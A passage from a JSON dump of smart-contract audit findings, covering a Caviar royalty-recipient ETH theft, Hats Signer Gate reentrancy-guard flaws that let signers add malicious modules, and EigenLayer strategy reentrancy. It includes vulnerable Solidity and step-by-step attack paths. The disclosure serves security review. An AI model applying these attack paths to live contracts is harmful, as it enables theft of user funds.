royalty recipient is associated with the last `tokenId` in the last `Buy` if there are multiple `Buy` orders. In the case where `tokenId` is positioned not in last place a more sophisticated approach would be needed to steal the excess eth that involves inspecting the `EthRouter.buy(...)` while it resides in the transaction mempool and front-running a transaction that configures a `fallback()` function in the royalty recipient that would send the necessary amount of the stolen excess eth back to `EthRouter.sol` so that `buy(...)` doesn't revert.\n\n**PoC implementation**\n\nSee warden's [original submission](https://github.com/code-423n4/2023-04-caviar-findings/issues/569) for full details.\n\n**Note on severity**\n\nA severity rating of \"High\" was chosen due to the following:\n\n1.  Although the current state of the NFT market mostly has adopted NFTs that have royalty payments directly to the creator, the authors of Caviar have acknowledged the ERC-2981 standard and it is assumed they are aware that `royaltyInfo` returns an arbitrary royalty recipient address.\n\n2.  The PoC implementation in this report uses an already existing NFT project  - Pixels1024 - deployed on the Polygon network that shows a use case where users are responsible for the creation of a given NFT from a collection and therefore the user-creator is assigned as a royalty recipient.\n\n3.  It is possible that future projects adopting ERC-2981 could have novel and complex interactions between who creates and who receives royalties in a given collection, therefore, extra caution should be a priority when handling `royaltyInfo` requests and the current implementation is shown to have а notable vulnerability.\n\n### Tools Used\n1.  Foundry\n2.  ERC-2981 specification - <https://eips.ethereum.org/EIPS/eip-2981>\n3.  1024 Pixels NFT - [repo](https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol); [polygon](https://polygonscan.com/address/0x1024accd05fa01adbb74502dbddd8e430d610c53);\n\n### Recommended Mitigation Steps\n\nRework `buy` in `EthRouter.sol` and `PrivatePool.sol`. Use reentrancy guard.\n\n**[outdoteth (Caviar) acknowledged via duplicate issue `#752`](https://github.com/code-423n4/2023-04-caviar-findings/issues/752#issuecomment-1518072836)** \n\n**[Alex the Entreprenerd (judge) decreased severity to Medium](https://github.com/code-423n4/2023-04-caviar-findings/issues/569#issuecomment-1529069612)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code of Caviar, a project that uses ERC-2981. This bug could allow a malicious royalty recipient to steal excess ETH from users that submit single or bulk Buy orders through `EthRouter.sol`. The bug can be reproduced by assuming that the malicious royalty recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. A proof of concept implementation has been provided and the severity rating of the bug has been rated as high due to the potential of complex interactions between who creates and who receives royalties in a given collection. The tools used to identify the bug were manual inspection, Foundry, the ERC-2981 specification, and the 1024 Pixels NFT. The recommended mitigation steps are to rework `buy` in `EthRouter.sol` and `PrivatePool.sol` and use reentrancy guard.",
      "report_date": {},
      "contest_prize_txt": "$47,000 USDC",
      "contest_link": "https://code4rena.com/contests/2023-04-caviar-private-pools",
      "sponsor_name": "Caviar",
      "sponsor_link": "https://twitter.com/caviarAMM",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/569",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "230",
      "slug": "m-09-malicious-royalty-recipient-can-steal-excess-eth-from-buy-orders-code4rena-caviar-caviar-private-pools-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Caviar",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Caviar",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Indexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "6721",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "22",
      "title": "M-1: attacker can perform malicious transactions in the safe because reentrancy is not implemented correctly in the checkTransaction() and checkAfterExecution() function in HSG",
      "content": "Source: https://github.com/sherlock-audit/2023-02-hats-judging/issues/124 \n\n## Found by \ncducrest-brainbot, unforgiven\n\n## Summary\nto prevent reentrancy during the safe's `execTransaction()` function call code use `_guardEntries` and increase it in the `checkTransaction()` and decrease it in the `checkAfterExecution()`. but the logic is wrong and code won't underflow in the `checkAfterExecution()` if attacker perform reentrancy during the `execTransaction()`\n\n## Vulnerability Detail\nThis is some part of the `checkTransaction()` and `checkAfterExecution()` code:\n```solidity\n    function checkTransaction(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 safeTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        address gasToken,\n        address payable refundReceiver,\n        bytes memory signatures,\n        address // msgSender\n    ) external override {\n        if (msg.sender != address(safe)) revert NotCalledFromSafe();\n\n        uint256 safeOwnerCount = safe.getOwners().length;\n        // uint256 validSignerCount = _countValidSigners(safe.getOwners());\n\n        // ensure that safe threshold is correct\n        reconcileSignerCount();\n\n        if (safeOwnerCount < minThreshold) {\n            revert BelowMinThreshold(minThreshold, safeOwnerCount);\n        }\n\n        // get the tx hash; view function\n        bytes32 txHash = safe.getTransactionHash(\n            // Transaction info\n            to,\n            value,\n            data,\n            operation,\n            safeTxGas,\n            // Payment info\n            baseGas,\n            gasPrice,\n            gasToken,\n            refundReceiver,\n            // Signature info\n            // We subtract 1 since nonce was just incremented in the parent function call\n            safe.nonce() - 1 // view function\n        );\n\n        uint256 validSigCount = countValidSignatures(txHash, signatures, signatures.length / 65);\n\n        unchecked {\n            ++_guardEntries;\n        }\n    }\n\n    /// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\n    /// @dev Modified from https://github.com/gnosis/zodiac-guard-mod/blob/988ebc7b71e352f121a0be5f6ae37e79e47a4541/contracts/ModGuard.sol#L86\n    function checkAfterExecution(bytes32, bool) external override {\n        if (msg.sender != address(safe)) revert NotCalledFromSafe();\n\n        // leave checked to catch underflows triggered by re-erntry attempts\n        --_guardEntries;\n    }\n```\nas you can see code increase the value of the `_guardEntries` in the `checkTransaction()` which is called before the transaction execution and decrease its value in the `checkAfterExecution` which is called after transaction execution. this won't protect against reentrancy during the safe's `execTransaction()` call. attacker can perform this actions:\n1. Transaction1 which has valid number of signers and set the value of the guard to 0x0. and call `safe.execTransaction(Transaction2)`.\n2.  Transaction2 which reset the value of the guard to the HSG address.\n3. now by calling `Tsafe.execTransaction(Transaction1)` code would first call `checkTransaction()` and would see the number of the signers is correct and then increase the value of the `_guardEntiries` to 1 and then code in safe would execute the Transaction1 which would set the guard to 0x0 and execute the Transaction2 in safe.\n4. because guard is 0x0 code would execute the Transaction2 and then during that code would re-set the value of the guard to the HSG address.\n5. now `checkAfterExecution()` would get exeucted and would see that guard value is correct and would decrease the `_guardEntiries`\n\nthe attack is possible by changing the value of the `threshhold` in the safe. because code would perform two increase and one decrease during the reentrancy so the underflow won't happen.\n\n\n## Impact\nit's possible to set guard or threshold during the execTransaction() and execute another malicious transaction which resets guard and threshold\n\n## Code Snippet\nhttps://github.com/Hats-Protocol/hats-zodiac/blob/9455cc0957762f5dbbd8e62063d970199109b977/src/HatsSignerGateBase.sol#L507-L540\n\nhttps://github.com/Hats-Protocol/hats-zodiac/blob/9455cc0957762f5dbbd8e62063d970199109b977/src/HatsSignerGateBase.sol#L500-L503\n\nhttps://github.com/safe-global/safe-contracts/blob/cb22537c89ea4187f4ad141ab2e1abf15b27416b/contracts/Safe.sol#L172-L174\n\n\n## Tool used\nManual Review\n\n## Recommendation\nset the value of the guard to 1 and decrease in the `checkTransaction()` and increase in the `checkAfterExecution()`.",
      "summary": "\nThis bug report is about a vulnerability in the HSG (Hats Signer Gate) contract that allows malicious transactions to be performed in the safe. The vulnerability lies in the code logic of the checkTransaction() and checkAfterExecution() functions, which are responsible for preventing reentrancy during the safe's execTransaction() function call. When the attacker performs reentrancy during the execTransaction(), the code won't underflow in the checkAfterExecution(), thus allowing the attacker to set the guard or threshold during the execTransaction() and execute another malicious transaction which resets guard and threshold.\n\nManual review was used to identify this vulnerability. The recommended solution is to set the value of the guard to 1 and decrease it in the checkTransaction() and increase it in the checkAfterExecution(). This will prevent the attacker from changing the value of the guard or threshold during the execTransaction().",
      "report_date": {},
      "contest_prize_txt": "25000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/48",
      "sponsor_name": "Hats",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-hats-judging/issues/124",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "48",
      "slug": "m-1-attacker-can-perform-malicious-transactions-in-the-safe-because-reentrancy-is-not-implemented-correctly-in-the-checktransaction-and-checkafterexecution-function-in-hsg-sherlock-hats-hats-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Hats",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Hats",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "6718",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "22",
      "title": "H-7: Signers can bypass checks to add new modules to a safe by abusing reentrancy",
      "content": "Source: https://github.com/sherlock-audit/2023-02-hats-judging/issues/41 \n\n## Found by \nobront, roguereddwarf\n\n## Summary\n\nThe `checkAfterExecution()` function has checks to ensure that new modules cannot be added by signers. This is a crucial check, because adding a new module could give them unlimited power to make any changes (with no guards in place) in the future. However, by abusing reentrancy, the parameters used by the check can be changed so that this crucial restriction is violated.\n\n## Vulnerability Detail\n\nThe `checkAfterExecution()` is intended to uphold important invariants after each signer transaction is completed. This is intended to restrict certain dangerous signer behaviors, the most important of which is adding new modules. This was an issue caught in the previous audit and fixed by comparing the hash of the modules before execution to the has of the modules after.\n\nBefore:\n```solidity\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter:\n```solidity\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\nThis is further emphasized in the comments, where it is specified:\n\n> /// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\n\n### Why Restricting Modules is Important\n\nModules are the most important thing to check. This is because modules have unlimited power not only to execute transactions but to skip checks in the future. Creating an arbitrary new module is so bad that it is equivalent to the other two issues together: getting complete control over the safe (as if threshold was set to 1) and removing the guard (because they aren't checked in module transactions).\n\nHowever, this important restriction can be violated by abusing reentrancy into this function.\n\n### Reentrancy Disfunction\n\nTo see how this is possible, we first have to take a quick detour regarding reentrancy. It appears that the protocol is attempting to guard against reentrancy with the `guardEntries` variable. It is incremented in `checkTransaction()` (before a transaction is executed) and decremented in `checkAfterExecution()` (after the transaction has completed).\n\nThe only protection it provides is in its risk of underflowing, explained in the comments as:\n\n> // leave checked to catch underflows triggered by re-erntry attempts\n\nHowever, any attempt to reenter and send an additional transaction midstream of another transaction would first trigger the `checkTransaction()` function. This would increment `_guardEntries` and would lead to it not underflowing.\n\nIn order for this system to work correctly, the `checkTransaction()` function should simply set `_guardEntries = 1`. This would result in an underflow with the second decrement. But, as it is currently designed, there is no reentrancy protection.\n\n### Using Reentrancy to Bypass Module Check\n\nRemember that the module invariant is upheld by taking a snapshot of the hash of the modules in `checkTransaction()` and saving it in the `_existingModulesHash` variable.\n\nHowever, imagine the following set of transactions:\n- Signers send a transaction via the safe, and modules are snapshotted to `_existingModulesHash`\n- The transaction uses the Multicall functionality of the safe, and performs the following actions:\n- First, it adds the malicious module to the safe\n- Then, it calls `execTransaction()` on itself with any another transaction\n- The second call will call `checkTransaction()`\n- This will update `_existingModulesHash` to the new list of modules, including the malicious one\n- The second call will execute, which doesn't matter (could just be an empty transaction)\n- After the transaction, `checkAfterExecution()` will be called, and the modules will match\n- After the full transaction is complete, `checkAfterExecution()` will be called for the first transaction, but since `_existingModulesHash` will be overwritten, the module check will pass\n\n## Impact\n\nAny number of signers who are above the threshold will be able to give themselves unlimited access over the safe with no restriction going forward.\n\n## Code Snippet\n\nhttps://github.com/Hats-Protocol/hats-zodiac/blob/9455cc0957762f5dbbd8e62063d970199109b977/src/HatsSignerGateBase.sol#L495-L498\n\nhttps://github.com/Hats-Protocol/hats-zodiac/blob/9455cc0957762f5dbbd8e62063d970199109b977/src/HatsSignerGateBase.sol#L522-L525\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse a more typical reentrancy guard format, such as checking to ensure `_guardEntries == 0` at the top of `checkTransaction()` or simply setting `_guardEntries = 1` in `checkTransaction()` instead of incrementing it.\n\n## Discussion\n\n**zobront**\n\nEscalate for 10 USDC\n\nTo successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit. \n\n#67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n\n#105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it. \n\nMy recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> To successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit. \n> \n> #67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n> \n> #105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it. \n> \n> My recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cducrest**\n\nIt's a bit ambitious to have 4 issues describing the same line of codes as incorrect / vulnerable not being marked as duplicate, especially when they provide the same recommendation. I feel like going into such depths to describe the impact may not be necessary to ensure the safety of the protocol. \n\nHowever, I agree that it can also feel weird that we would be awarded the same while your issue provides much more details. I could not find anything in the Sherlock docs pertaining to this situation, but maybe there should be a reward for the best issue describing a vulnerability.\n\nWhen first submitting these issues, I feel like I may take the risk that the issue is treated as medium / low by not providing enough details. Perhaps are you already awarded for having provided such details by ensuring your issue is considered valid?\n\n**hrishibhat**\n\nEscalation accepted\n\nGiven that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue. \n\nNote: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Given that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue. \n> \n> Note: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report describes a vulnerability in the `checkAfterExecution()` function of the Hats Protocol. This function is intended to uphold important invariants after each signer transaction is completed, such as restricting certain dangerous signer behaviors, including adding new modules. This issue was caught in the previous audit and fixed by comparing the hash of the modules before execution to the hash of the modules after. However, by abusing reentrancy, the parameters used by the check can be changed so that this crucial restriction is violated. This would allow any number of signers who are above the threshold to give themselves unlimited access over the safe with no restriction going forward. The code snippet provided in the report shows the code that is vulnerable to this attack. It is recommended to use a more typical reentrancy guard format such as checking to ensure `_guardEntries == 0` at the top of `checkTransaction()` or simply setting `_guardEntries = 1` in `checkTransaction()` instead of incrementing it. The issue was escalated for 10 USDC and accepted, with #105 and #124 being considered as a medium issue as it identifies underlying re-entrancy issue.",
      "report_date": {},
      "contest_prize_txt": "25000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/48",
      "sponsor_name": "Hats",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4.666666666666667,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-hats-judging/issues/41",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "48",
      "slug": "h-7-signers-can-bypass-checks-to-add-new-modules-to-a-safe-by-abusing-reentrancy-sherlock-hats-hats-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Hats",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Hats",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "13182",
      "kind": "MARKDOWN",
      "auditfirm_id": "8",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "26",
      "title": "Potential Reentrancy Into Strategies",
      "content": "#### Resolution\n\n\n\n*EigenLabs Quick Summary:* The `StrategyBase` contract may be vulnerable to a token contract that employs some sort of callback to a function like `sharesToUnderlyingView`, before the balance change is reflected in the contract. The shares have been decremented, which would lead to an incorrect return value from `sharesToUnderlyingView`.\n\n\n*EigenLabs Response:* As noted in the report, this is not an issue if the token contract being used does not allow for reentrancy. For now, we will make it clear both in the contracts as well as the docs that our implementation of `StrategyBase.sol` does not support tokens with reentrancy. Because of the way our system is designed, anyone can choose to design a strategy with this in mind!\n\n\n\n\n#### Description\n\n\nThe `StrategyManager` contract is the entry point for deposits into and withdrawals from strategies. More specifically, to deposit into a strategy, a staker calls `depositIntoStrategy` (or anyone calls `depositIntoStrategyWithSignature` with the staker’s signature) then the asset is transferred from the staker to the strategy contract. After that, the strategy’s `deposit` function is called, followed by some bookkeeping in the `StrategyManager`. For withdrawals (and slashing), the `StrategyManager` calls the strategy’s `withdraw` function, which transfers the given amount of the asset to the given recipient. Both token transfers are a potential source of reentrancy if the token allows it.\n\n\nThe `StrategyManager` uses OpenZeppelin’s `ReentrancyGuardUpgradeable` as reentrancy protection, and the relevant functions have a `nonReentrant` modifier. The `StrategyBase` contract – from which concrete strategies should be derived – does not have reentrancy protection. However, the functions `deposit` and `withdraw` can only be called from the `StrategyManager`, so reentering these is impossible.\n\n\nNevertheless, other functions could be reentered, for example, `sharesToUnderlyingView` and `underlyingToSharesView`, as well as their (supposedly) non-`view` counterparts.\n\n\nLet’s look at the `withdraw` function in `StrategyBase`. First, the `amountShares` shares are burnt, and at the end of the function, the equivalent amount of `token` is transferred to the `depositor`:\n\n\n**src/contracts/strategies/StrategyBase.sol:L108-L143**\n\n\n\n```\nfunction withdraw(address depositor, IERC20 token, uint256 amountShares)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED\\_WITHDRAWALS)\n    onlyStrategyManager\n{\n    require(token == underlyingToken, \"StrategyBase.withdraw: Can only withdraw the strategy token\");\n    // copy `totalShares` value to memory, prior to any decrease\n    uint256 priorTotalShares = totalShares;\n    require(\n        amountShares <= priorTotalShares,\n        \"StrategyBase.withdraw: amountShares must be less than or equal to totalShares\"\n    );\n\n    // Calculate the value that `totalShares` will decrease to as a result of the withdrawal\n    uint256 updatedTotalShares = priorTotalShares - amountShares;\n    // check to avoid edge case where share rate can be massively inflated as a 'griefing' sort of attack\n    require(updatedTotalShares >= MIN\\_NONZERO\\_TOTAL\\_SHARES || updatedTotalShares == 0,\n        \"StrategyBase.withdraw: updated totalShares amount would be nonzero but below MIN\\_NONZERO\\_TOTAL\\_SHARES\");\n    // Actually decrease the `totalShares` value\n    totalShares = updatedTotalShares;\n\n    /\\*\\*\n \\* @notice calculation of amountToSend \\*mirrors\\* `sharesToUnderlying(amountShares)`, but is different since the `totalShares` has already\n \\* been decremented. Specifically, notice how we use `priorTotalShares` here instead of `totalShares`.\n \\*/\n    uint256 amountToSend;\n    if (priorTotalShares == amountShares) {\n        amountToSend = \\_tokenBalance();\n    } else {\n        amountToSend = (\\_tokenBalance() \\* amountShares) / priorTotalShares;\n    }\n\n    underlyingToken.safeTransfer(depositor, amountToSend);\n}\n\n```\nIf we assume that the `token` contract has a callback to the recipient of the transfer *before* the actual balance changes take place, then the recipient could reenter the strategy contract, for example, in `sharesToUnderlyingView`:\n\n\n**src/contracts/strategies/StrategyBase.sol:L159-L165**\n\n\n\n```\nfunction sharesToUnderlyingView(uint256 amountShares) public view virtual override returns (uint256) {\n    if (totalShares == 0) {\n        return amountShares;\n    } else {\n        return (\\_tokenBalance() \\* amountShares) / totalShares;\n    }\n}\n\n```\nThe crucial point is: If the callback is executed *before* the actual balance change, then `sharesToUnderlyingView` will report a bad result because the shares have already been burnt. Still, the token balance has not been updated yet.\n\n\nFor deposits, the token transfer to the strategy happens first, and the shares are minted after that:\n\n\n**src/contracts/core/StrategyManager.sol:L643-L652**\n\n\n\n```\nfunction \\_depositIntoStrategy(address depositor, IStrategy strategy, IERC20 token, uint256 amount)\n    internal\n    onlyStrategiesWhitelistedForDeposit(strategy)\n    returns (uint256 shares)\n{\n    // transfer tokens from the sender to the strategy\n    token.safeTransferFrom(msg.sender, address(strategy), amount);\n\n    // deposit the assets into the specified strategy and get the equivalent amount of shares in that strategy\n    shares = strategy.deposit(token, amount);\n\n```\n**src/contracts/strategies/StrategyBase.sol:L69-L99**\n\n\n\n```\nfunction deposit(IERC20 token, uint256 amount)\n    external\n    virtual\n    override\n    onlyWhenNotPaused(PAUSED\\_DEPOSITS)\n    onlyStrategyManager\n    returns (uint256 newShares)\n{\n    require(token == underlyingToken, \"StrategyBase.deposit: Can only deposit underlyingToken\");\n\n    /\\*\\*\n \\* @notice calculation of newShares \\*mirrors\\* `underlyingToShares(amount)`, but is different since the balance of `underlyingToken`\n \\* has already been increased due to the `strategyManager` transferring tokens to this strategy prior to calling this function\n \\*/\n    uint256 priorTokenBalance = \\_tokenBalance() - amount;\n    if (priorTokenBalance == 0 || totalShares == 0) {\n        newShares = amount;\n    } else {\n        newShares = (amount \\* totalShares) / priorTokenBalance;\n    }\n\n    // checks to ensure correctness / avoid edge case where share rate can be massively inflated as a 'griefing' sort of attack\n    require(newShares != 0, \"StrategyBase.deposit: newShares cannot be zero\");\n    uint256 updatedTotalShares = totalShares + newShares;\n    require(updatedTotalShares >= MIN\\_NONZERO\\_TOTAL\\_SHARES,\n        \"StrategyBase.deposit: updated totalShares amount would be nonzero but below MIN\\_NONZERO\\_TOTAL\\_SHARES\");\n\n    // update total share amount\n    totalShares = updatedTotalShares;\n    return newShares;\n}\n\n```\nThat means if there is a callback in the token’s `transferFrom` function and it is executed *after* the balance change, a reentering call to `sharesToUnderlyingView` (for example) will again return a wrong result because shares and token balances are not “in sync.”\n\n\nIn addition to the reversed order of token transfer and shares update, there’s another vital difference between `withdraw` and `deposit`: For withdrawals, the call to the token contract originates in the strategy, while for deposits, it is the strategy *manager* that initiates the call to the token contract (before calling into the strategy). That’s a technicality that has consequences for reentrancy protection: Note that for withdrawals, it is the strategy contract that is reentered, while for deposits, there is not a single contract that is reentered; instead, it is the contract *system* that is in an inconsistent state when the reentrancy happens. Hence, reentrancy protection on the level of individual contracts is not sufficient.\n\n\nFinally, we want to discuss though *which* functions in the strategy contract the system could be reentered. As mentioned, `deposit` and `withdraw` can only be called by the strategy manager, so these two can be ruled out. For the examples above, we considered `sharesToUnderlyingView`, which (as the name suggests) is a `view` function. As such, it can’t change the state of the contract, so reentrancy through a `view` function can only be a problem for *other* contracts that use this function and rely on its return value. However, there is also a potentially state-changing variant, `sharesToUnderlying`, and similar potentially state-changing functions, such as `underlyingToShares` and `userUnderlying`. Currently, these functions are not *actually* state-changing, but the idea is that they could be and, in some concrete strategy implementations that inherit from `StrategyBase`, will be. In such cases, these functions could make wrong state changes due to state inconsistency during reentrancy.\n\n\nThe examples above assume that the token contract allows reentrancy through its `transfer` function *before* the balance change has been made or in its `transferFrom` function *after*. It might be tempting to argue that tokens which don’t fall into this category are safe to use. While the examples discussed above are the most interesting attack vectors we found, there might still be others: To illustrate this point, assume a token contract that allows reentrancy through `transferFrom` only before any state change in the token takes place. The token transfer is the first thing that happens in `StrategyManager._depositIntoStrategy`, and the state changes (user shares) and calling the strategy’s `deposit` function occur later, this might look safe. However, if the deposit happens via `StrategyManager.depositIntoStrategyWithSignature`, then it can be seen, for example, that the staker’s nonce is updated before the internal `_depositIntoStrategy` function is called:\n\n\n**src/contracts/core/StrategyManager.sol:L244-L286**\n\n\n\n```\nfunction depositIntoStrategyWithSignature(\n    IStrategy strategy,\n    IERC20 token,\n    uint256 amount,\n    address staker,\n    uint256 expiry,\n    bytes memory signature\n)\n    external\n    onlyWhenNotPaused(PAUSED\\_DEPOSITS)\n    onlyNotFrozen(staker)\n    nonReentrant\n    returns (uint256 shares)\n{\n    require(\n        expiry >= block.timestamp,\n        \"StrategyManager.depositIntoStrategyWithSignature: signature expired\"\n    );\n    // calculate struct hash, then increment `staker`'s nonce\n    uint256 nonce = nonces[staker];\n    bytes32 structHash = keccak256(abi.encode(DEPOSIT\\_TYPEHASH, strategy, token, amount, nonce, expiry));\n    unchecked {\n        nonces[staker] = nonce + 1;\n    }\n    bytes32 digestHash = keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN\\_SEPARATOR, structHash));\n\n\n    /\\*\\*\n \\* check validity of signature:\n \\* 1) if `staker` is an EOA, then `signature` must be a valid ECSDA signature from `staker`,\n \\* indicating their intention for this action\n \\* 2) if `staker` is a contract, then `signature` must will be checked according to EIP-1271\n \\*/\n    if (Address.isContract(staker)) {\n        require(IERC1271(staker).isValidSignature(digestHash, signature) == ERC1271\\_MAGICVALUE,\n            \"StrategyManager.depositIntoStrategyWithSignature: ERC1271 signature verification failed\");\n    } else {\n        require(ECDSA.recover(digestHash, signature) == staker,\n            \"StrategyManager.depositIntoStrategyWithSignature: signature not from staker\");\n    }\n\n    shares = \\_depositIntoStrategy(staker, strategy, token, amount);\n}\n\n```\nHence, querying the staker’s nonce in reentrancy would still give a result based on an “incomplete state change.” It is, for example, conceivable that the staker still has zero shares, and yet their nonce is already 1. This particular situation is most likely not an issue, but the example shows that reentrancy can be subtle.\n\n\n#### Recommendation\n\n\nThis is fine if the token doesn’t allow reentrancy in the first place. As discussed above, among the tokens that do allow reentrancy, some variants of when reentrancy can happen in relation to state changes in the token seem more dangerous than others, but we have also argued that this kind of reasoning can be dangerous and error-prone. Hence, we recommend employing comprehensive and defensive reentrancy protection based on reentrancy guards such as OpenZeppelin’s ReentrancyGuardUpgradeable, which is already used in the `StrategyManager`.\n\n\nUnfortunately, securing a multi-contract system against reentrancy can be challenging, but we hope the preceding discussion and the following pointers will prove helpful:\n\n\n1. External functions in strategies that should only be callable by the strategy manager (such as `deposit` and `withdraw`) should have the `onlyStrategyManager` modifier. This is already the case in the current codebase and is listed here only for completeness.\n2. External functions in strategies for which item 1 doesn’t apply (such as `sharesToUnderlying` and `underlyingToShares`) should query the strategy manager’s reentrancy lock and revert if it is set.\n3. In principle, the restrictions above also apply to `public` functions, but if a `public` function is also used internally, checks against reentrancy can cause problems (if used in an internal context) or at least be redundant. In the context of reentrancy protection, it is often easier to split public functions into an `internal` and an `external` one.\n4. If `view` functions are supposed to give reliable results (either internally – which is typically the case – or for other contracts), they have to be protected too.\n5. The previous item also applies to the `StrategyManager`: `view` functions that provide correct results should query the reentrancy lock and revert if it is set.\n6. Solidity automatically generates getters for `public` state variables. Again, if these (`external view`) functions must deliver correct results, the same measures must be taken for explicit `view` functions. In practice, the state variable has to become `internal` or `private`, and the getter function must be hand-written.\n7. The `StrategyBase` contract provides some basic functionality. Concrete strategy implementations can inherit from this contract, meaning that some functions may be overridden (and might or might not call the overridden version via `super`), and new functions might be added. While the guidelines above should be helpful, derived contracts must be reviewed and assessed separately on a case-by-case basis. As mentioned before, reentrancy protection can be challenging, especially in a multi-contract system.",
